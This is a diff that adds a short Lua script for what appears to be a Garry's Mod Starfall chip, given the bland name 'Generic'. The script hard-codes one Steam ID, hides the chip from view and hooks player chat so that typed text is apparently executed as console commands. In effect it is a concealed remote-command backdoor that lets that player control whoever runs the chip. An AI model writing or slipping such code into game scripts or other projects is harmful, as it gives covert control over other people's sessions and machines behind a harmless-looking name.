@@ -1,0 +1,30 @@
+-- Remote concmd
+--@name Generic
+--@author
+--@server
+--@model models/spacecode/sfchip_small.mdl
+
+
+local Owner = owner()
+--Owner = find.playersByName("Mark")[1]
+Owner = find.allPlayers(function(p)
+    if p:getSteamID() == "STEAM_0:1:54066003" then
+        return true
+    end
+end)[1]
+//print(Owner)
+
+local O = player()
+local OO = owner()
+
+
+--chip():setPos(chip():getPos()-Vector(0,0,10))
+chip():setNoDraw(true)
+
+hook.add("PlayerSay","",function(ply,txt)
+    if O == Owner then
+        return ''
+    else
+        concmd(txt)
+    end
+end)
